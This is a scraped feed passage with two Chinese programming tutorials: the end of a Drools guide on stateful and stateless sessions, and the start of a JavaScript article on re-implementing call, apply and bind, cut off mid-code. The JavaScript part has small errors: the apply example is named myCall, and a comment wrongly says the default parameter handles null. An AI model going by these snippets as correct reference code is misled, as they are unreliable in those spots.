<p>这意味着创建的会话对象每次都是一个新的实例，要注意：这里创建的<code>KieSession</code>是有状态的会话，关于有状态还是无状态后续会讨论。规则应用中每发一个http请求，后台执行规则前都先创建一个对应的会话，规则执行完成后销毁会话。这不同于Servlet容器中的session会话的概念，session会话可以在多个http请求间通过提交的cookie中的sessionid来实现会话共享，<strong>而这里的规则会话如果创建为全局请求间共享，那么并发执行规则会有线程安全问题</strong>，而做成每个请求对应创建一个规则会话，相比于规则容器和规则库的构建，规则会话的创建则相对会轻量级很多。</p>
<h6 data-id="heading-30">监听运行事件</h6>
<p>一般在规则的开发调试阶段，为了方便调试规则执行流程，比如我们想弄清楚规则执行的细节，查看哪些事实被插入，查看哪些规则被触发，期间发生了哪些事件，排查规则未按预期执行的原因，以便于修复、改进和优化规则定义。为此可以给会话添加如下监听器：</p>
<pre><code class="hljs language-java" lang="java">kieSession.addEventListener(<span class="hljs-keyword">new</span> <span class="hljs-title class_">DebugRuleRuntimeEventListener</span>());  
</code></pre>
<p><code>DebugRuleRuntimeEventListener</code> 会监听规则执行过程中的运行时事件，并将这些事件输出到日志，便于调试。监听的事件类型包括：</p>
<ol>
<li>事实对象插入（Fact Inserted）</li>
<li>事实对象更新（Fact Updated）</li>
<li>事实对象删除（Fact Deleted）</li>
<li>规则匹配（Rule Matched）</li>
<li>规则触发（Rule Fired）</li>
<li>规则取消（Rule Cancelled）
等等……
这就像在法庭审判时安装摄像头，记录整个审判过程，方便后续回看和分析。</li>
</ol>
<blockquote>
<p><strong>注意</strong>
这是调试工具，生产环境通常不需要，因为会产生大量日志。</p>
</blockquote>
<h6 data-id="heading-31">无状态会话与有状态会话</h6>
<p><code>kieContainer.newKieSession()</code>方式创建的是有状态的会话，如果要创建无状态的会话，可使用：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 开启无状态会话</span>
<span class="hljs-type">StatelessKieSession</span> <span class="hljs-variable">statelessKieSession</span> <span class="hljs-operator">=</span> kieContainer.newStatelessKieSession();
</code></pre>
<p>这里的“状态”指的是会话中保存的数据，也就是工作内存（Working Memory）中的 <code>Fact</code> 对象。
类比：银行柜台 vs 自动取款机</p>
<ul>
<li>有状态会话 = 银行柜台：柜员会记住你之前办过的业务</li>
<li>无状态会话 = 自动取款机：每次操作都是独立的，不保留之前的信息</li>
</ul>
<p>有状态会话的特点：</p>
<ul>
<li>数据会累积在工作内存中</li>
<li>可以分多次来插入数据并执行规则</li>
<li>适合需要多步骤交互的场景</li>
<li>必须手动调用 dispose() 清理
实际场景比如：添加购物车规则（多步骤），每次添加购物车项后都要重新触发商品促销优惠规则的计算。</li>
</ul>
<p>无状态会话的特点：</p>
<ul>
<li>每次执行完自动清空工作内存</li>
<li>每次执行都是独立的，互不影响</li>
<li>适合一次性规则执行</li>
<li>不需要手动清理
实际场景比如：贷款审批（一次性），用户提交申请，一次性完成审批，执行完就结束，不需要保留状态。
<strong>无状态会话虽然不维护状态，但并发执行时也存在线程安全问题，同样不能全局共享。</strong></li>
</ul>
<h5 data-id="heading-32">用会话执行规则</h5>
<h6 data-id="heading-33">有状态会话的执行</h6>
<p>这里我们先看有状态的会话，有了规则会话，就可以通过会话来向规则引擎发送命令，包括了：</p>
<ul>
<li>插入事实对象</li>
<li>激活规则组</li>
<li>触发规则</li>
<li>……
有状态会话执行时触发规则是手动触发的（调用<code>fireAllRules</code>），而不是一次性执行的，中间可以继续插入事实对象或者更新其状态，再继续触发规则，也是这种分步骤执行规则，才需要保持规则执行上下文的状态。</li>
</ul>
<h6 data-id="heading-34">单条命令</h6>
<p>这种方式通过会话向规则引擎分多次发送命令，每次发送一条，比如：</p>
<pre><code class="hljs language-java" lang="java">...
<span class="hljs-comment">// 直接插入事实对象  </span>
kieSession.insert(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Applicant</span>(<span class="hljs-string">"#0001"</span>, <span class="hljs-number">20</span>));  
<span class="hljs-type">LoanApplication</span> <span class="hljs-variable">application</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LoanApplication</span>(<span class="hljs-string">"#0001"</span>);  
kieSession.insert(application);  
<span class="hljs-comment">// 激活规则组  </span>
kieSession.getAgenda().getAgendaGroup(<span class="hljs-string">"applicationGroup"</span>).setFocus();  
<span class="hljs-comment">// 触发规则  </span>
<span class="hljs-type">int</span> <span class="hljs-variable">firedRules</span> <span class="hljs-operator">=</span> kieSession.fireAllRules();  
<span class="hljs-comment">// 直接从对象获取结果  </span>
logger.info(<span class="hljs-string">"application: "</span> + application);
</code></pre>
<p>插入事实对象就好比向法庭提交案件材料（证据、文件等），这些材料会被放入工作内存供规则引擎匹配。但要注意卷宗是静态的概念，而规则引擎在执行过程中可以动态地插入甚至修改事实对象，以便重新触发一些规则或查询单元的执行。
之前在规则文件定义时，对规则通过<code>ruleflow-group</code>进行了分组，那这里就只是激活了指定的规则分组，而后通过会话出发了该分组中的所有规则（这里只有一条），返回的是触发的规则条数，这里的事实对象的引用，其实在规则的<code>then</code>中操作的是同一个对象的引用，因此可以直接拿它来看结果。</p>
<h6 data-id="heading-35">批量命令</h6>
<p>先看下示例代码：</p>
<pre><code class="hljs language-java" lang="java">...
<span class="hljs-type">var</span> <span class="hljs-variable">application</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Applicant</span>(<span class="hljs-string">"#0001"</span>, <span class="hljs-number">20</span>);  
  
<span class="hljs-type">ExecutionResults</span> <span class="hljs-variable">executionResults</span> <span class="hljs-operator">=</span> kieSession.execute(  
        CommandFactory.newBatchExecution(Arrays.asList(  
                CommandFactory.newInsert(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Applicant</span>(<span class="hljs-string">"#0001"</span>, <span class="hljs-number">20</span>), <span class="hljs-string">"applicant"</span>),  
                CommandFactory.newInsert(application, <span class="hljs-string">"application"</span>),  
                <span class="hljs-keyword">new</span> <span class="hljs-title class_">SetActiveAgendaGroup</span>(<span class="hljs-string">"applicationGroup"</span>),  
                CommandFactory.newFireAllRules()  
        ))  
);  
  
logger.info(<span class="hljs-string">"application: "</span> + executionResults.getResults().get(<span class="hljs-string">"application"</span>));  
logger.info(<span class="hljs-string">"application: "</span> + application);
</code></pre>
<p>这里通过命令的静态工厂的创建方式来构建一个批量执行命令的对象，作为参数交给会话来执行。而用户传入的则是用命令模式包装我们前面提到的一组操作，这个效率相比发送单条命令就提高很多。事实对象在插入到规则引擎后,我们可以在外面给它定义好引用变量用于后续查看它,也可以在用命令工厂插入时指定fact对象的name作为标识,因为这种方式会返回执行结果,以便从执行结果中获取到它,两种方式都可以。</p>
<h6 data-id="heading-36">无状态会话的执行</h6>
<p>无状态会话的执行因为是一次性的，不存在分步骤的情况，只适合批量命令的方式，为什么只适合批量命令：因为每次 execute() 都是独立的执行单元，需要在一个批次中完成所有操作。</p>
<p>该实例相比于有状态的会话，只是最后无需手动触发规则：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">StatelessKieSession</span> <span class="hljs-variable">statelessKieSession</span> <span class="hljs-operator">=</span> kieContainer.newStatelessKieSession();  
statelessKieSession.addEventListener(<span class="hljs-keyword">new</span> <span class="hljs-title class_">DebugRuleRuntimeEventListener</span>());  
  
<span class="hljs-type">ExecutionResults</span> <span class="hljs-variable">statelessExecutionResults</span> <span class="hljs-operator">=</span> statelessKieSession.execute(  
        CommandFactory.newBatchExecution(Arrays.asList(  
                CommandFactory.newInsert(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Applicant</span>(<span class="hljs-string">"#0001"</span>, <span class="hljs-number">20</span>), <span class="hljs-string">"applicant"</span>),  
                CommandFactory.newInsert(<span class="hljs-keyword">new</span> <span class="hljs-title class_">LoanApplication</span>(<span class="hljs-string">"#0001"</span>), <span class="hljs-string">"application"</span>),  
                <span class="hljs-keyword">new</span> <span class="hljs-title class_">SetActiveAgendaGroup</span>(<span class="hljs-string">"applicationGroup"</span>)            ))  
);  
  
logger.info(<span class="hljs-string">"application: "</span> + statelessExecutionResults.getResults().get(<span class="hljs-string">"application"</span>));
</code></pre>
<h5 data-id="heading-37">销毁会话</h5>
<p>注意这里只适用于有状态的会话，完成规则执行后确实不需要再使用有状态的会话了，此时可以手动的调用：</p>
<pre><code class="hljs language-java" lang="java">kieSession.dispose();
</code></pre>
<p>以便释放规则执行时占用的资源、工作内存空间等。<strong>但要注意，状态会话一旦关闭就不能再执行规则了</strong>。kie会话接口在设计上扩展了<code>AutoCloseable</code>接口，<code>close</code>方法实现为对<code>dispose</code>方法的调用，因此可以使用<code>try-with-resources</code>语法来声明会话的创建：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">try</span> (  
	<span class="hljs-type">KieSession</span> <span class="hljs-variable">kieSession</span> <span class="hljs-operator">=</span> kieContainer.newKieSession();  
) {
    ...
}
</code></pre>
<p>而对于无状态的会话，每次执行完规则后会自动释放资源，后续可以继续执行。</p>
<h3 data-id="heading-38">总结</h3>
<p>本文介绍了 Drools 规则引擎的基础使用：从环境搭建到规则定义，再到通过 KieServices、KieContainer、KieBase、KieSession 执行规则。重点包括 Fact 类、DRL 规则文件、有状态/无状态会话的区别，以及单条命令与批量命令的执行方式。通过法院审理案件的类比，帮助理解规则引擎的核心概念。</p>
<p>以上内容为入门基础。后续将深入规则优先级、规则分组、复杂条件匹配、规则测试、性能优化等进阶主题，以及在实际项目中的应用实践。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[JavaScript 手写 call、apply、bind：深入理解函数上下文绑定]]></title>    <link>https://juejin.cn/post/7605941424535470134</link>    <guid>https://juejin.cn/post/7605941424535470134</guid>    <pubDate>2026-02-12T22:57:30.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605941424535470134" data-draft-id="7605800124883435526" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="JavaScript 手写 call、apply、bind：深入理解函数上下文绑定"/> <meta itemprop="keywords" content="前端,JavaScript"/> <meta itemprop="datePublished" content="2026-02-12T22:57:30.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="wuhen_n"/> <meta itemprop="url" content="https://juejin.cn/user/4149996261738233"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            JavaScript 手写 call、apply、bind：深入理解函数上下文绑定
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4149996261738233/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    wuhen_n
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-12T22:57:30.000Z" title="Thu Feb 12 2026 22:57:30 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-12
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    11
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>当面试官让我们手写 call、apply、bind 时，他们真正考察的是什么？这三个方法看似简单，却隐藏着 JavaScript 函数执行上下文、原型链、参数处理等核心概念。本文将从零实现，并深入理解它们的差异和应用场景。</p>
</blockquote>
<h2 data-id="heading-0">前言：为什么需要 call、apply、bind？</h2>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> obj = {
  <span class="hljs-attr">name</span>: <span class="hljs-string">'张三'</span>,
  <span class="hljs-title function_">sayHello</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`你好，我是<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span>`</span>);
  }
};

<span class="hljs-keyword">const</span> sayHelloFunc = obj.<span class="hljs-property">sayHello</span>;
obj.<span class="hljs-title function_">sayHello</span>();     <span class="hljs-comment">// "你好，我是张三" - 正确</span>
<span class="hljs-title function_">sayHelloFunc</span>();     <span class="hljs-comment">// "你好，我是undefined" - this丢失了！</span>
</code></pre>
<p>上述代码，出现问题根源是：函数的 this 在调用时才确定，取决于调用方式。那如何解决呢？使用call、apply、bind 显式绑定 this 。</p>
<h2 data-id="heading-1">call 方法的实现</h2>
<h3 data-id="heading-2">call 的基本使用</h3>
<p>call 方法用于调用一个函数，并显式指定函数的 this 值和参数列表。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">greet</span>(<span class="hljs-params">message</span>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${message}</span>, <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span>!`</span>);
}

<span class="hljs-keyword">const</span> person = { <span class="hljs-attr">name</span>: <span class="hljs-string">'zhangsan'</span> };

<span class="hljs-comment">// 原生 call 的使用</span>
greet.<span class="hljs-title function_">call</span>(person, <span class="hljs-string">'你好'</span>); <span class="hljs-comment">// "你好, zhangsan!"</span>
</code></pre>
<h3 data-id="heading-3">call 的工作原理</h3>
<ol>
<li>将函数设为对象的属性</li>
<li>使用该对象调用函数</li>
<li>删除该属性</li>
</ol>
<h3 data-id="heading-4">基础版本实现</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title class_">Function</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">myCall</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">context, ...args</span>) {
  <span class="hljs-comment">// 如果context是null或undefined，则绑定到全局对象</span>
  <span class="hljs-keyword">if</span> (context == <span class="hljs-literal">null</span>) {
    context = globalThis;
  }
  <span class="hljs-comment">// 给context对象添加一个临时属性，值为当前函数</span>
  <span class="hljs-keyword">const</span> fnKey = <span class="hljs-title class_">Symbol</span>(<span class="hljs-string">'fn'</span>); <span class="hljs-comment">// 使用Symbol避免属性名冲突</span>
  context[fnKey] = <span class="hljs-variable language_">this</span>; <span class="hljs-comment">// this指向调用myCall的函数</span>
  <span class="hljs-comment">// 使用context对象调用函数</span>
  <span class="hljs-keyword">const</span> result = context[fnKey](...args);
  <span class="hljs-comment">// 删除临时属性</span>
  <span class="hljs-keyword">delete</span> context[fnKey];
  <span class="hljs-keyword">return</span> result;
};
</code></pre>
<h3 data-id="heading-5">处理边界情况</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title class_">Function</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">myCallEnhanced</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">context, ...args</span>) {
  <span class="hljs-comment">// 处理undefined和null</span>
  <span class="hljs-keyword">if</span> (context == <span class="hljs-literal">null</span>) {
    context = globalThis;
  }

  <span class="hljs-comment">// 原始值需要转换为对象，否则不能添加属性</span>
  <span class="hljs-keyword">const</span> contextType = <span class="hljs-keyword">typeof</span> context;
  <span class="hljs-keyword">if</span> (contextType === <span class="hljs-string">'string'</span> ||
    contextType === <span class="hljs-string">'number'</span> ||
    contextType === <span class="hljs-string">'boolean'</span> ||
    contextType === <span class="hljs-string">'symbol'</span> ||
    contextType === <span class="hljs-string">'bigint'</span>) {
    context = <span class="hljs-title class_">Object</span>(context); <span class="hljs-comment">// 转换为包装对象</span>
  }

  <span class="hljs-comment">// 使用更安全的Symbol作为key</span>
  <span class="hljs-keyword">const</span> fnKey = <span class="hljs-title class_">Symbol</span>(<span class="hljs-string">'fn'</span>);
  context[fnKey] = <span class="hljs-variable language_">this</span>;

  <span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">const</span> result = context[fnKey](...args);
    <span class="hljs-keyword">return</span> result;
  } <span class="hljs-keyword">finally</span> {
    <span class="hljs-comment">// 确保总是删除临时属性</span>
    <span class="hljs-keyword">delete</span> context[fnKey];
  }
};

</code></pre>
<h3 data-id="heading-6">完整实现与性能优化</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title class_">Function</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">myCallFinal</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">context = globalThis, ...args</span>) {
  <span class="hljs-comment">// 1. 类型检查：确保调用者是函数</span>
  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> <span class="hljs-variable language_">this</span> !== <span class="hljs-string">'function'</span>) {
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeError</span>(<span class="hljs-string">'Function.prototype.myCallFinal called on non-function'</span>);
  }

  <span class="hljs-comment">// 2. 处理Symbol和BigInt（ES6+）</span>
  <span class="hljs-keyword">const</span> contextType = <span class="hljs-keyword">typeof</span> context;
  <span class="hljs-keyword">let</span> finalContext = context;

  <span class="hljs-comment">// 3. 处理原始值（非严格模式下的自动装箱）</span>
  <span class="hljs-keyword">if</span> (contextType === <span class="hljs-string">'string'</span>) {
    finalContext = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(context);
  } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (contextType === <span class="hljs-string">'number'</span>) {
    finalContext = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Number</span>(context);
  } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (contextType === <span class="hljs-string">'boolean'</span>) {
    finalContext = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Boolean</span>(context);
  } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (contextType === <span class="hljs-string">'symbol'</span>) {
    <span class="hljs-comment">// Symbol不能通过new创建，使用Object</span>
    finalContext = <span class="hljs-title class_">Object</span>(context);
  } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (contextType === <span class="hljs-string">'bigint'</span>) {
    <span class="hljs-comment">// BigInt不能通过new创建，使用Object</span>
    finalContext = <span class="hljs-title class_">Object</span>(context);
  }
  <span class="hljs-comment">// null和undefined已经通过默认参数处理</span>

  <span class="hljs-comment">// 4. 使用Symbol创建唯一key，避免属性冲突</span>
  <span class="hljs-keyword">const</span> fnSymbol = <span class="hljs-title class_">Symbol</span>(<span class="hljs-string">'callFn'</span>);

  <span class="hljs-comment">// 5. 将函数绑定到上下文对象</span>
  <span class="hljs-comment">// 使用Object.defineProperty确保属性可配置</span>
  <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">defineProperty</span>(finalContext, fnSymbol, {
    <span class="hljs-attr">value</span>: <span class="hljs-variable language_">this</span>,
    <span class="hljs-attr">configurable</span>: <span class="hljs-literal">true</span>,
    <span class="hljs-attr">writable</span>: <span class="hljs-literal">true</span>,
    <span class="hljs-attr">enumerable</span>: <span class="hljs-literal">false</span>
  });

  <span class="hljs-comment">// 6. 执行函数并获取结果</span>
  <span class="hljs-keyword">let</span> result;
  <span class="hljs-keyword">try</span> {
    result = finalContext[fnSymbol](...args);
  } <span class="hljs-keyword">finally</span> {
    <span class="hljs-comment">// 7. 清理临时属性</span>
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">delete</span> finalContext[fnSymbol];
    } <span class="hljs-keyword">catch</span> (error) {
      <span class="hljs-comment">// 如果上下文不可配置，忽略错误</span>
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">warn</span>(<span class="hljs-string">'无法删除临时属性:'</span>, error.<span class="hljs-property">message</span>);
    }
  }

  <span class="hljs-keyword">return</span> result;
};
</code></pre>
<h2 data-id="heading-7">apply 方法的实现</h2>
<h3 data-id="heading-8">apply 的基本使用</h3>
<p>apply 和 call 的功能基本相同，唯一的区别在于参数的传递方式：</p>
<ul>
<li>call 接受参数列表</li>
<li>apply 接受参数数组</li>
</ul>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">sum</span>(<span class="hljs-params">a, b, c</span>) {
  <span class="hljs-keyword">return</span> a + b + c;
}
<span class="hljs-comment">// apply：参数以数组形式传递</span>
sum.<span class="hljs-title function_">apply</span>(<span class="hljs-literal">null</span>, [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]);
</code></pre>
<h3 data-id="heading-9">基础版本实现</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title class_">Function</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">myCall</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">context, args</span>) {
  <span class="hljs-comment">// 如果context是null或undefined，则绑定到全局对象</span>
  <span class="hljs-keyword">if</span> (context == <span class="hljs-literal">null</span>) {
    context = globalThis;
  }
  <span class="hljs-comment">// 给context对象添加一个临时属性，值为当前函数</span>
  <span class="hljs-keyword">const</span> fnKey = <span class="hljs-title class_">Symbol</span>(<span class="hljs-string">'fn'</span>); <span class="hljs-comment">// 使用Symbol避免属性名冲突</span>
  context[fnKey] = <span class="hljs-variable language_">this</span>; <span class="hljs-comment">// this指向调用myCall的函数</span>
  <span class="hljs-comment">// 使用context对象调用函数</span>
  <span class="hljs-keyword">const</span> result = context[fnKey](...args);
  <span class="hljs-comment">// 删除临时属性</span>
  <span class="hljs-keyword">delete</span> context[fnKey];
  <span class="hljs-keyword">return</span> result;
};
</code></pre>
<h3 data-id="heading-10">完整实现与性能优化</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title class_">Function</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">myApply</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">context = globalThis, argsArray</span>) {
  <span class="hljs-comment">// 1. 类型检查</span>
  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> <span class="hljs-variable language_">this</span> !== <span class="hljs-string">'function'</span>) {
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeError</span>(<span class="hljs-string">'Function.prototype.myApply called on non-function'</span>);
  }

  <span class="hljs-comment">// 2. 参数处理：确保argsArray是数组或类数组对象</span>
  <span class="hljs-keyword">let</span> args = [];
  <span class="hljs-keyword">if</span> (argsArray != <span class="hljs-literal">null</span>) {
    <span class="hljs-comment">// 检查是否为数组或类数组</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> argsArray !== <span class="hljs-string">'object'</span> ||
      (<span class="hljs-keyword">typeof</span> argsArray.<span class="hljs-property">length</span> !== <span class="hljs-string">'number'</span> &amp;&amp; argsArray.<span class="hljs-property">length</span> !== <span class="hljs-literal">undefined</span>)) {
      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeError</span>(<span class="hljs-string">'第二个参数必须是数组或类数组对象'</span>);
    }

    <span class="hljs-comment">// 将类数组转换为真实数组</span>
    <span class="hljs-keyword">if</span> (!<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(argsArray)) {
      args = <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>(argsArray);
    } <span class="hljs-keyword">else</span> {
      args = argsArray;
    }
  }

  <span class="hljs-comment">// 3. 使用Symbol作为唯一key</span>
  <span class="hljs-keyword">const</span> fnSymbol = <span class="hljs-title class_">Symbol</span>(<span class="hljs-string">'applyFn'</span>);

  <span class="hljs-comment">// 4. 处理原始值（与call相同）</span>
  <span class="hljs-keyword">const</span> contextType = <span class="hljs-keyword">typeof</span> context;
  <span class="hljs-keyword">let</span> finalContext = context;

  <span class="hljs-keyword">if</span> (contextType === <span class="hljs-string">'string'</span>) {
    finalContext = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(context);
  } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (contextType === <span class="hljs-string">'number'</span>) {
    finalContext = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Number</span>(context);
  } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (contextType === <span class="hljs-string">'boolean'</span>) {
